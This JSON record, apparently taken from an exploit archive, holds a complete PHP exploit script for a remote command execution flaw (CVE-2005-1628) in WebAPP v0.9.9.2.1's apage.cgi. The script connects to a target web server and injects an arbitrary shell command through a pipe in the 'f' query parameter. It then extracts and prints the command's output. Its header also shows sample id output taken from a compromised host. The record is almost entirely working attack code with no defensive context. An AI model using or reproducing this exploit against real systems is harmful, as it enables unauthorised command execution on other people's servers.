{
  "id": "1004",
  "title": "WebAPP 0.9.9.2.1 - Remote Command Execution (2)",
  "cve": "CVE-2005-1628",
  "vuln_type": "unknown",
  "code": "<?php\r\n\r\n########################################################\r\n#                                                      #\r\n#  WebAPP v0.9.9.2.1 Remote Command Execution Exploit  #\r\n#                 [Code by Nikyt0x]                    #\r\n#                 nikyt0x@gmail.com                    #\r\n#                                                      #\r\n#    Advisory: www.defacers.com.mx/advisories/3.txt    #                                               #\r\n#                                                      #\r\n#    Saludos:                                          #\r\n#                                                      #\r\n#    Soulblack Staff, Status-x, NeosecurityTeam,       #\r\n#    KingMetal, Trespasser...                          #\r\n#                                                      #\r\n########################################################\r\n#                                                      #\r\n# sbwebapp.php www.host.com /dirto/apage.cgi \"command\" #\r\n#                                                      #\r\n# Linux dprhensim19.doteasy.com 2.4.22-1.2199.nptl     #\r\n# #1 Wed Aug 4 12:21:48 EDT 2004 i686 i686 i386        #\r\n# GNU/Linux                                            #\r\n# uid=557(scapip) gid=558(scapip) groups=558(scapip)   #\r\n#                                                      #\r\n#                                                      #\r\n#                                                      #\r\n########################################################\r\n\r\n\r\nif ($argc != 4) {\r\n\r\n   echo \"\\n              =====================================\\n\";\r\n   echo \"               WebAPP v0.9.9.2.1 apage.cgi Exploit\\n\";\r\n   echo \"              =====================================\\n\";\r\n   echo \"                    Nikyt0x - SoulBlack Team\\n\\n\";\r\n   echo \"\\nUsage:\\n\\n\";\r\n   echo \" $argv[0] www.host.com /apagedir/apage.cgi \\\"command\\\"\\n\";\r\n   exit(0);\r\n   }\r\n\r\nif(!ereg('apage.cgi',$argv[2])) {\r\n   echo \"URL to apage.cgi Incorrect.\";\r\n   exit(0);\r\n   }\r\n\r\n   echo \"\\n              =====================================\\n\";\r\n   echo \"               WebAPP v0.9.9.2.1 apage.cgi Exploit\\n\";\r\n   echo \"              =====================================\\n\";\r\n   echo \"                    Nikyt0x - SoulBlack Team\\n\\n\";\r\n\r\n\r\n\r\n\r\n$s0ck3t = fsockopen($argv[1], 80);\r\nif (!$s0ck3t) {\r\n   echo \"[-] Socket\\n\";\r\n   exit(0);\r\n   \r\n} else {\r\n   $ex3cutar = str_replace(\" \", \"%20\", $argv[3]);\r\n   $petici0n = \"GET $argv[2]?f=expofranquicias.htm|echo%20c0mand0s;$ex3cutar;echo%20final1zar| HTTP/1.1\\r\\n\";\r\n   $petici0n .= \"Host: $argv[1]\\r\\n\";\r\n   $petici0n .= \"Connection: Close\\r\\n\\r\\n\";\r\n   \r\n   echo \"[+] Socket\\n\";\r\n   \r\n   if(!fwrite($s0ck3t, $petici0n))\r\n   {\r\n   echo \"[-] Sending Exploit\\n\";\r\n   exit(0);\r\n   }\r\n   echo \"[+] Sending Exploit\\n\";\r\n   while (!feof($s0ck3t)) {\r\n       $g3tdata = fgets($s0ck3t, 1024);\r\n\t   if (eregi('c0mand0s',$g3tdata))\r\n\t   {\r\n\t   $aceptar = 1;\r\n\t   }\r\n\t   if (eregi('final1zar',$g3tdata))\r\n\t   {\r\n\t   $aceptar = 0;\r\n\t   }\r\n\t   while ($aceptar == 1)\r\n\t   {\r\n\t  \t   if(eregi('c0mand0s',$g3tdata))\r\n\t\t   {\r\n\t\t    $g3tdata = str_replace('c0mand0s','', $g3tdata);\r\n\t\t   echo \"[+] Command:\\n\";\r\n\t\t   }\r\n\t\t   $g3tdata = str_replace('c0mand0s','', $g3tdata);\r\n\t\t   echo $g3tdata;\r\n\t\t   break;\r\n\t   }\r\n\t   \r\n   }\r\n   fclose($s0ck3t);\r\n}\r\n?> \r\n\r\n# milw0rm.com [2005-05-20]",
  "url": "https://www.exploit-db.com/exploits/1004"
}